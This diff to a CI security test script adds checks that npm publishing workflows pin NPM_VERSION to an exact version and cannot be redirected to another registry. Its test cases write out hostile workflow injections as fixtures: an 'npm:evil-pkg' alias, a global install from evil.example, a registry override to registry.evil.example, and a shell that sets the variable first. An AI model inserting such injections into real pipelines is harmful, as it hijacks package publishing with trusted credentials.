@@ -30,7 +30,9 @@
 #      BuildKit images pinned by digest, and no Bun, Go cache or binfmt image
 #      restored from the Actions cache (writable by any run on main), and
 #      (#680) no SBOM generator image by tag. Both
-#      npm publishers pin the same exact npm, and every Dockerfile base image
+#      npm publishers pin the same exact npm, no workflow sets NPM_VERSION
+#      anywhere but at its top level and there only to an exact x.y.z, and an
+#      npm: alias is never an exact version (#960), and every Dockerfile base image
 #      is pinned by tag and digest, its Bun bases at BUN_VERSION (#783). Not
 #      checked: setup-node's node-version major (runner tool cache).
 #   6. Per-job authority (#682): no matrix job holds id-token (every leg would
@@ -88,7 +90,7 @@ trap 'rm -rf "$WORK"' EXIT
 
 # check <rule> <file>: one violation per line, nothing when clean.
 #   rule = scoped | publish-perms | pinned | authority | untrusted | mutable
-#          | narrow | pushcache | catalog-pr
+#          | narrow | pushcache | catalog-pr | npmpin
 check() {
 	# shellcheck disable=SC2016 # JavaScript source, not shell: nothing should expand.
 	RULE="$1" FILE="$2" REPO="${REPO_DIR:-${HERE}/../..}" bun -e '
@@ -359,11 +361,16 @@ if (rule === "mutable") {
           if (line.startsWith("#")) continue;
           // A global install runs that package at whatever version the spec
           // names: every package in it needs an exact @x.y.z.
-          const g = /\b(?:npm|pnpm)\s+(?:install|i|add)\b(.*)$/.exec(line);
-          if (g && /(?:^|\s)(?:-g|--global)\b/.test(g[1]))
+          // Options may come before the verb (npm -g install x), and the
+          // global flag anywhere on the line (#960 review).
+          const g = /\b(?:npm|pnpm)(?:\s+-\S+)*\s+(?:install|i|add)\b(.*)$/.exec(line);
+          if (g && /(?:^|\s)(?:-g|--global|--location[= ]global)\b/.test(line))
             for (const tok of g[1].split(/\s+/).filter((x) => x && !x.startsWith("-"))) {
-              const at = tok.lastIndexOf("@");
-              if (at <= 0 || !exactVersion.test(tok.slice(at + 1)))
+              // The first @ after the name, not the last (#960): in
+              // npm@npm:other@1.2.3 the version is an alias that installs
+              // another package, and its last @ is followed by 1.2.3.
+              const at = tok.indexOf("@", 1);
+              if (at <= 0 || !/^(?:@[\w.~-]+\/)?[\w.~-]+$/.test(tok.slice(0, at)) || !exactVersion.test(tok.slice(at + 1)))
                 out.push(label + ": global install of " + tok + " is not an exact version: " + raw.trim());
             }
           if (/\b(?:bun|bunx|npx|pnpm|yarn)\b.*@(?:latest|next|canary|nightly)\b/.test(line))
@@ -506,18 +513,37 @@ if (rule === "narrow") {
     const lines = runs.split("\n").map((l) => stripComment(l).trim());
     // npm verbs that run package or repository code, and any global install
     // that is not npm itself pinned to NPM_VERSION.
-    const npmRuns = cmd("npm\\s+(?:ci|install|i|add|isntall|in|it|install-test|install-ci-test|run|run-script|rum|urn|exec|x|pack|rebuild|rb|test|t|tst|start|restart|stop|update|up|upgrade|dedupe|link|ln|explore)\\b");
-    const globalOther = (line) => /\bnpm\s+(?:install|i|add)\b/.test(line) && /\s(?:-g|--global)\b/.test(line) &&
-      line.replace(/\s(?:-g|--global)\b/, "").replace(/^.*?\bnpm\s+(?:install|i|add)\s+/, "").trim() !== "\"npm@${NPM_VERSION}\"";
-    if (oidc && /\bnpm\s+publish\b/.test(runs)) {
+    // Options may come before the verb (#960 review: npm -g install x).
+    const npmRuns = cmd("npm(?:\\s+-\\S+)*\\s+(?:ci|install|i|add|isntall|in|it|install-test|install-ci-test|run|run-script|rum|urn|exec|x|pack|rebuild|rb|test|t|tst|start|restart|stop|update|up|upgrade|dedupe|link|ln|explore)\\b");
+    // The pinned install is that exact line and nothing else on it: no
+    // VAR=value in front (npm_config_registry=...), no other spelling.
+    const isGlobal = (line) => /\s(?:-g|--global|--location[= ]global)\b/.test(line);
+    const globalOther = (line) => /\bnpm(?:\s+-\S+)*\s+(?:install|i|add)\b/.test(line) && isGlobal(line) &&
+      line.trim() !== "npm install -g \"npm@${NPM_VERSION}\"";
+    if (oidc && /\bnpm\b[^\n;&|]*\spublish\b/.test(runs)) {
       if (steps.some((st) => String(st.uses ?? "").startsWith("oven-sh/setup-bun@")))
         out.push(name + ": publishes with id-token and installs Bun");
+      // The shell a step runs in, its own or a default, is one of the plain
+      // ones: anything else (env X=y bash, bash -c ...) runs code first.
+      const plainShell = ["bash", "sh", "bash -e {0}", "sh -e {0}", "bash --noprofile --norc -eo pipefail {0}"];
+      for (const st of steps) {
+        const sh = st.shell ?? job.defaults?.run?.shell ?? doc.defaults?.run?.shell;
+        if (sh !== undefined && !plainShell.includes(String(sh).trim()))
+          out.push(name + ": step with shell: " + sh + " in a job that publishes with id-token");
+      }
+      // npm reads npm_config_* from the environment, the registry included,
+      // so the pinned install could come from anywhere; and setup-node may
+      // point the publish at the npm registry only.
+      for (const [lvl, e] of [["workflow", doc.env], ["job", job.env], ...steps.map((st) => ["step " + (st.name ?? st.uses ?? ""), st.env])])
+        for (const k of Object.keys(e ?? {}))
+          if (/^npm_config_/i.test(k)) out.push(name + ": " + lvl + " env sets " + k + " in a job that publishes with id-token");
       for (const st of steps)
-        if (st.shell !== undefined && !/^(bash|sh)\b/.test(String(st.shell)))
-          out.push(name + ": step with shell: " + st.shell + " in a job that publishes with id-token");
+        if (String(st.uses ?? "").toLowerCase().startsWith("actions/setup-node@") && st.with?.["registry-url"] !== undefined &&
+            String(st.with["registry-url"]).replace(/\/$/, "") !== "https://registry.npmjs.org")
+          out.push(name + ": setup-node registry-url is " + JSON.stringify(st.with["registry-url"]) + ", not https://registry.npmjs.org");
       for (const line of lines)
         if (cmd("(?:bun|bunx|npx|yarn|pnpm|node|make|python3?|perl|ruby|deno|go)\\b").test(line) ||
-            (npmRuns.test(line) && !(/\s(?:-g|--global)\b/.test(line) && !globalOther(line))) || globalOther(line))
+            (npmRuns.test(line) && !(isGlobal(line) && !globalOther(line))) || globalOther(line))
           out.push(name + ": publishes with id-token and runs: " + line);
     }
     // publish-brain is the tarball-only shape (#682): no checkout, nothing
@@ -571,7 +597,7 @@ if (rule === "narrow") {
       for (const line of lines)
         if (cmd("go\\s+(?:build|install|generate|run|test|vet|mod|get)\\b").test(line) || /build-sidecar\.sh/.test(line) ||
             cmd("(?:bun|bunx|npx|yarn|pnpm|make|swiftc|swift|xcodebuild|clang|gcc|cc|cargo|cmake)\\b").test(line) ||
-            (npmRuns.test(line) && !(/\s(?:-g|--global)\b/.test(line) && !globalOther(line))))
+            (npmRuns.test(line) && !(isGlobal(line) && !globalOther(line))))
           out.push(name + ": builds in a job holding id-token: " + line);
       for (const st of steps)
         if (String(st.uses ?? "").startsWith("./"))
@@ -844,6 +870,50 @@ if (rule === "pushcache") {
     }
   }
 }
+if (rule === "npmpin") {
+  // #960: `npm install -g "npm@${NPM_VERSION}"` is exempted by text in the
+  // npm publish jobs (narrow, release-exec.test.sh), which is sound only
+  // while NPM_VERSION is the workflow pin: an exact x.y.z, set once at the
+  // top. Set again below that -- by a job, a step, a container, a script or
+  // $GITHUB_ENV -- it could name anything, an npm: alias of another package
+  // included, and that package would be installed globally with its
+  // lifecycle scripts in a job holding id-token. Names compared ignoring
+  // case, as a Windows runner does.
+  const isPin = (k) => /^npm_version$/i.test(k);
+  const npmCheck = "[[ \"$NPM_VERSION\" =~ ^[0123456789]+\\.[0123456789]+\\.[0123456789]+$ ]] || { echo \"::error::NPM_VERSION is not an exact x.y.z, so it could name another package (#960)\"; exit 1; }";
+  for (const e of [doc.env, ...Object.values(jobs).map((j) => j.env)])
+    for (const v of Object.values(e ?? {}))
+      if (/^\s*npm_version\s*=/im.test(String(v))) out.push("an env value sets NPM_VERSION when written to GITHUB_ENV: " + JSON.stringify(v));
+  for (const [k, v] of Object.entries(doc.env ?? {}))
+    if (isPin(k) && !/^\d+\.\d+\.\d+$/.test(String(v))) out.push("env." + k + " is " + JSON.stringify(v) + ", not an exact x.y.z");
+  for (const [name, job] of Object.entries(jobs)) {
+    for (const k of Object.keys(job.env ?? {})) if (isPin(k)) out.push(name + ": sets " + k + " over the workflow pin");
+    for (const k of Object.keys(job.container?.env ?? {})) if (isPin(k)) out.push(name + ": its container sets " + k + " over the workflow pin");
+    for (const [i, { st, via }] of flatSteps(job.steps).entries()) {
+      const label = name + ": step " + (via ? "(via " + via.slice(0, -3) + ") " : "") + (st.name ?? st.id ?? st.uses ?? String(i));
+      for (const k of Object.keys(st.env ?? {})) if (isPin(k)) out.push(label + " sets " + k + " over the workflow pin");
+      // The pinned install is checked where it runs (#960 review): the line
+      // before it in the same script is the exact x.y.z test, so a value set
+      // any way this rule cannot read (a default shell, BASH_ENV, a sourced
+      // file, a GITHUB_ENV line built from env) still stops the step.
+      const code = (typeof st.run === "string" ? st.run : "").split("\n").map((l) => l.trim()).filter((l) => l && !l.startsWith("#"));
+      code.forEach((l, j) => {
+        if (/npm@\$\{?npm_version\b/i.test(l) && code[j - 1] !== npmCheck)
+          out.push(label + " installs npm@${NPM_VERSION} without the exact-version check on the line before it");
+      });
+      if (code.some((l) => /npm@\$\{?npm_version\b/i.test(l)) && (st["continue-on-error"] !== undefined || job["continue-on-error"] !== undefined))
+        out.push(label + " installs npm@${NPM_VERSION} in a step or job that may continue on error");
+      for (const v of Object.values(st.env ?? {}))
+        if (/^\s*npm_version\s*=/im.test(String(v))) out.push(label + " has an env value that sets NPM_VERSION when written to GITHUB_ENV");
+      // An assignment (plain, +=, ${X:=...}, export and friends, read,
+      // printf -v) or a GITHUB_ENV line, which is the same text; comments
+      // dropped.
+      const run = (typeof st.run === "string" ? st.run : "").split("\n").filter((l) => !/^\s*#/.test(l)).join("\n");
+      if (/(?:^|[\s;&|(`"\x27])npm_version\+?=|\$\{npm_version:?=|\b(?:export|declare|typeset|local|readonly|read)\s+(?:-\w+\s+)*npm_version\b|\bprintf\s+-v\s*npm_version\b/im.test(run))
+        out.push(label + " sets NPM_VERSION in its script (for itself, or for later steps through GITHUB_ENV)");
+    }
+  }
+}
 if (rule === "pinned") {
   const uses = [];
   for (const [name, job] of Object.entries(jobs)) {
@@ -926,6 +996,96 @@ if [ "$(printf '%s\n' "$npm_pins" | wc -l)" -eq 1 ] && [[ "$npm_pins" =~ ^\"[0-9
 else
 	no "release-exec.yml and sidecar-release.yml pin the same exact npm" "got: ${npm_pins}"
 fi
+# ...and nothing below the workflow level sets NPM_VERSION again (#960), in
+# any workflow: the npm publishers exempt `npm install -g "npm@${NPM_VERSION}"`
+# by its text, so the variable has to be the pin wherever that line runs.
+for f in "$WORKFLOWS"/*.yml; do
+	expect_clean "$(basename "$f"): NPM_VERSION is set once, at the top, to an exact version" npmpin "$f"
+done
+# shellcheck disable=SC2016 # literal workflow text, not shell.
+{
+	expect_caught 'a job setting NPM_VERSION to an npm: alias over the pin (#960)' npmpin "$WORKFLOWS/sidecar-release.yml" \
+		$'  publish-sidecar:\n    # Same requirement' $'  publish-sidecar:\n    env:\n      NPM_VERSION: "npm:evil-pkg@12.1.0"\n    # Same requirement' \
+		'publish-sidecar: sets NPM_VERSION over the workflow pin'
+	expect_caught 'a step setting NPM_VERSION to an npm: alias over the pin (#960)' npmpin "$WORKFLOWS/release-exec.yml" \
+		$'      - name: Ensure npm supports Trusted Publishing\n        run: |' $'      - name: Ensure npm supports Trusted Publishing\n        env:\n          NPM_VERSION: "npm:evil-pkg@12.1.0"\n        run: |' \
+		'publish-brain: step Ensure npm supports Trusted Publishing sets NPM_VERSION over the workflow pin'
+	expect_caught 'a step setting npm_version in another case (#960)' npmpin "$WORKFLOWS/sidecar-release.yml" \
+		$'      - name: Ensure npm supports Trusted Publishing\n        run: |' $'      - name: Ensure npm supports Trusted Publishing\n        env:\n          npm_version: "npm:evil-pkg@12.1.0"\n        run: |' \
+		'publish-sidecar: step Ensure npm supports Trusted Publishing sets npm_version over the workflow pin'
+	expect_caught 'NPM_VERSION set for later steps through GITHUB_ENV (#960)' npmpin "$WORKFLOWS/sidecar-release.yml" \
+		$'      - name: Ensure npm supports Trusted Publishing\n        run: |\n          set -euo pipefail\n' $'      - name: Ensure npm supports Trusted Publishing\n        run: |\n          set -euo pipefail\n          echo "NPM_VERSION=npm:evil-pkg@12.1.0" >> "$GITHUB_ENV"\n' \
+		'sets NPM_VERSION in its script'
+	expect_caught 'NPM_VERSION assigned in the script that installs npm (#960)' npmpin "$WORKFLOWS/release-exec.yml" \
+		$'          set -euo pipefail\n          # Checked where it is used' $'          set -euo pipefail\n          export NPM_VERSION=npm:evil-pkg@12.1.0\n          # Checked where it is used' \
+		'sets NPM_VERSION in its script'
+	expect_caught 'NPM_VERSION defaulted with := in the script (#960)' npmpin "$WORKFLOWS/release-exec.yml" \
+		'          npm install -g "npm@${NPM_VERSION}"' '          npm install -g "npm@${NPM_VERSION:=npm:evil-pkg@12.1.0}"' \
+		'sets NPM_VERSION in its script'
+	expect_caught 'the workflow pin itself an npm: alias (#960)' npmpin "$WORKFLOWS/sidecar-release.yml" \
+		'  NPM_VERSION: "12.1.0"' '  NPM_VERSION: "npm:evil-pkg@12.1.0"' \
+		'env.NPM_VERSION is "npm:evil-pkg@12.1.0", not an exact x.y.z'
+	expect_caught 'a job container setting NPM_VERSION (#960)' npmpin "$WORKFLOWS/sidecar-release.yml" \
+		$'  publish-sidecar:\n    # Same requirement' $'  publish-sidecar:\n    container:\n      image: x\n      env:\n        NPM_VERSION: "npm:evil-pkg@12.1.0"\n    # Same requirement' \
+		'publish-sidecar: its container sets NPM_VERSION over the workflow pin'
+	expect_caught 'a workflow with no pin of its own gaining a job-level one (#960)' npmpin "$WORKFLOWS/test.yml" \
+		$'jobs:\n' $'jobs:\n  sneak:\n    runs-on: ubuntu-latest\n    permissions: {}\n    env:\n      NPM_VERSION: "npm:evil-pkg@12.1.0"\n    steps:\n      - run: npm install -g "npm@${NPM_VERSION}"\n' \
+		'sneak: sets NPM_VERSION over the workflow pin'
+	expect_caught 'a global install of npm through an npm: alias (#960)' mutable "$WORKFLOWS/release-exec.yml" \
+		'          npm install -g "npm@${NPM_VERSION}"' '          npm install -g "npm@npm:evil-pkg@12.1.0"' \
+		'global install of npm@npm:evil-pkg@12.1.0 is not an exact version'
+	expect_caught 'a global install of a scoped package through an alias (#960)' mutable "$WORKFLOWS/release-exec.yml" \
+		'          npm install -g "npm@${NPM_VERSION}"' '          npm install -g "@scope/tool@npm:evil-pkg@1.0.0"' \
+		'global install of @scope/tool@npm:evil-pkg@1.0.0 is not an exact version'
+	expect_caught 'a global install with the flag before the verb (#960 review)' mutable "$WORKFLOWS/release-exec.yml" \
+		'          npm install -g "npm@${NPM_VERSION}"' '          npm -g install "npm@npm:evil-pkg@12.1.0"' \
+		'global install of npm@npm:evil-pkg@12.1.0 is not an exact version'
+	expect_caught 'a global install of a URL (#960 review)' mutable "$WORKFLOWS/release-exec.yml" \
+		'          npm install -g "npm@${NPM_VERSION}"' '          npm i -g https://evil.example/x@1.2.3' \
+		'global install of https://evil.example/x@1.2.3 is not an exact version'
+	expect_caught 'the alias installed with the flag first in the npm publish job (#960 review)' narrow "$WORKFLOWS/sidecar-release.yml" \
+		'          npm install -g "npm@${NPM_VERSION}"' $'          npm install -g "npm@${NPM_VERSION}"\n          npm -g install "npm@npm:evil-pkg@12.1.0"' \
+		'publish-sidecar: publishes with id-token and runs: npm -g install'
+	expect_caught 'the pinned install pointed at another registry on its own line (#960 review)' narrow "$WORKFLOWS/sidecar-release.yml" \
+		'          npm install -g "npm@${NPM_VERSION}"' '          npm_config_registry=https://registry.evil.example/ npm install -g "npm@${NPM_VERSION}"' \
+		'publish-sidecar: publishes with id-token and runs: npm_config_registry='
+	expect_caught 'npm_config_registry in the npm publish job env (#960 review)' narrow "$WORKFLOWS/release-exec.yml" \
+		$'    needs: [validate-tag, sidecar-build, pack-brain]\n    runs-on: ubuntu-latest\n' $'    needs: [validate-tag, sidecar-build, pack-brain]\n    runs-on: ubuntu-latest\n    env:\n      npm_config_registry: https://registry.evil.example/\n' \
+		'publish-brain: job env sets npm_config_registry in a job that publishes with id-token'
+	expect_caught 'setup-node pointing the npm publish job at another registry (#960 review)' narrow "$WORKFLOWS/release-exec.yml" \
+		'          registry-url: "https://registry.npmjs.org"' '          registry-url: "https://registry.evil.example"' \
+		'publish-brain: setup-node registry-url is'
+	expect_caught 'a default shell that sets NPM_VERSION first (#960 review)' narrow "$WORKFLOWS/release-exec.yml" \
+		$'    needs: [validate-tag, sidecar-build, pack-brain]\n    runs-on: ubuntu-latest\n' $'    needs: [validate-tag, sidecar-build, pack-brain]\n    runs-on: ubuntu-latest\n    defaults:\n      run:\n        shell: env NPM_VERSION=npm:evil-pkg@12.1.0 bash -e {0}\n' \
+		'publish-brain: step with shell: env NPM_VERSION=npm:evil-pkg@12.1.0 bash -e {0}'
+	expect_caught 'a step shell that runs code before the script (#960 review)' narrow "$WORKFLOWS/release-exec.yml" \
+		$'      - name: Ensure npm supports Trusted Publishing\n        run: |' $'      - name: Ensure npm supports Trusted Publishing\n        shell: bash -c \x27export NPM_VERSION=npm:evil-pkg@12.1.0; . {0}\x27\n        run: |' \
+		'publish-brain: step with shell: bash -c'
+	expect_caught 'the pinned install without its exact-version check (#960 review)' npmpin "$WORKFLOWS/sidecar-release.yml" \
+		$'          [[ "$NPM_VERSION" =~ ^[0123456789]+\.[0123456789]+\.[0123456789]+$ ]] || { echo "::error::NPM_VERSION is not an exact x.y.z, so it could name another package (#960)"; exit 1; }\n' '' \
+		'publish-sidecar: step Ensure npm supports Trusted Publishing installs npm@${NPM_VERSION} without the exact-version check'
+	expect_caught 'the exact-version check loosened (#960 review)' npmpin "$WORKFLOWS/release-exec.yml" \
+		'          [[ "$NPM_VERSION" =~ ^[0123456789]+\.[0123456789]+\.[0123456789]+$ ]] || { echo "::error::NPM_VERSION is not an exact x.y.z, so it could name another package (#960)"; exit 1; }' '          [[ "$NPM_VERSION" =~ ^.+$ ]] || { echo "::error::NPM_VERSION is not an exact x.y.z, so it could name another package (#960)"; exit 1; }' \
+		'installs npm@${NPM_VERSION} without the exact-version check'
+	expect_caught 'the exact-version check after the install (#960 review)' npmpin "$WORKFLOWS/sidecar-release.yml" \
+		$'          [[ "$NPM_VERSION" =~ ^[0123456789]+\.[0123456789]+\.[0123456789]+$ ]] || { echo "::error::NPM_VERSION is not an exact x.y.z, so it could name another package (#960)"; exit 1; }\n          npm install -g "npm@${NPM_VERSION}"\n' $'          npm install -g "npm@${NPM_VERSION}"\n          [[ "$NPM_VERSION" =~ ^[0123456789]+\.[0123456789]+\.[0123456789]+$ ]] || { echo "::error::NPM_VERSION is not an exact x.y.z, so it could name another package (#960)"; exit 1; }\n' \
+		'installs npm@${NPM_VERSION} without the exact-version check'
+	expect_caught 'the pinned install in a step that may continue on error (#960 review)' npmpin "$WORKFLOWS/sidecar-release.yml" \
+		$'      - name: Ensure npm supports Trusted Publishing\n        run: |' $'      - name: Ensure npm supports Trusted Publishing\n        continue-on-error: true\n        run: |' \
+		'may continue on error'
+	expect_caught 'a GITHUB_ENV line built from an env value (#960 review)' npmpin "$WORKFLOWS/sidecar-release.yml" \
+		$'      - name: Ensure npm supports Trusted Publishing\n        run: |' $'      - name: Ensure npm supports Trusted Publishing\n        env:\n          L: "NPM_VERSION=npm:evil-pkg@12.1.0"\n        run: |' \
+		'has an env value that sets NPM_VERSION'
+	expect_caught 'NPM_VERSION appended to (#960 review)' npmpin "$WORKFLOWS/release-exec.yml" \
+		$'          set -euo pipefail\n          # Checked where it is used' $'          set -euo pipefail\n          NPM_VERSION+=-x\n          # Checked where it is used' \
+		'sets NPM_VERSION in its script'
+	expect_caught 'NPM_VERSION read from input (#960 review)' npmpin "$WORKFLOWS/release-exec.yml" \
+		$'          set -euo pipefail\n          # Checked where it is used' $'          set -euo pipefail\n          read -r NPM_VERSION <v.txt\n          # Checked where it is used' \
+		'sets NPM_VERSION in its script'
+	expect_caught 'NPM_VERSION set by printf -v (#960 review)' npmpin "$WORKFLOWS/release-exec.yml" \
+		$'          set -euo pipefail\n          # Checked where it is used' $'          set -euo pipefail\n          printf -v NPM_VERSION %s x\n          # Checked where it is used' \
+		'sets NPM_VERSION in its script'
+}
 # The image publish-docker pushes is built FROM these (#783). A base by tag
 # alone is whatever the registry says that day, so every external FROM names a
 # tag AND a digest, one tag never maps to two digests, and the Bun bases run
@@ -1070,7 +1230,7 @@ else
 fi
 # bun_pin_caught <label> <file under .github> <exact text> <replacement>
 bun_pin_caught() {
-	rm -rf "${WORK}/pins" && mkdir -p "${WORK}/pins" && cp -r "$WORKFLOWS" "${WORK}/pins/workflows" && cp -r "$ACTIONS_DIR" "${WORK}/pins/actions"
+	rm -rf "${WORK}/pins" && mkdir -p "${WORK}/pins" && cp -rL "$WORKFLOWS" "${WORK}/pins/workflows" && cp -rL "$ACTIONS_DIR" "${WORK}/pins/actions"
 	if ! FROM="${WORK}/pins/$2" OLD="$3" NEW="$4" bun -e '
 const s = await Bun.file(process.env.FROM).text();
 if (!s.includes(process.env.OLD)) { console.error("anchor not found"); process.exit(2); }
